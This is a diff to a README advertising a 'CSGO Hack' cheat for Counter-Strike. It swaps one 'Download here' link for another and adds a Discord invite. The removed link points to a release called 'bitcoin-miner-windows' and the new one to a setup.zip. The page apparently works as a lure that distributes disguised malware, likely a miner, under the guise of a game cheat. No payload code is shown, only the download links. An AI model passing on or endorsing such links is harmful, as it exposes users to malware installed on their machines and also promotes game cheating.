@@ -1,6 +1,6 @@
 # CSGO Hack Counter Strike Global Offansive : 
 
-<a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download here</a><br>
+<a href='https://github.com/ThetanMetacadeAxieInfinity/CSGOHack-/releases/download/csgo/setup.zip'>Download here</a><br>
 <a href="https://discord.gg/yWcTb9BX">Discord Chat </a>
 
 ## Getting Started
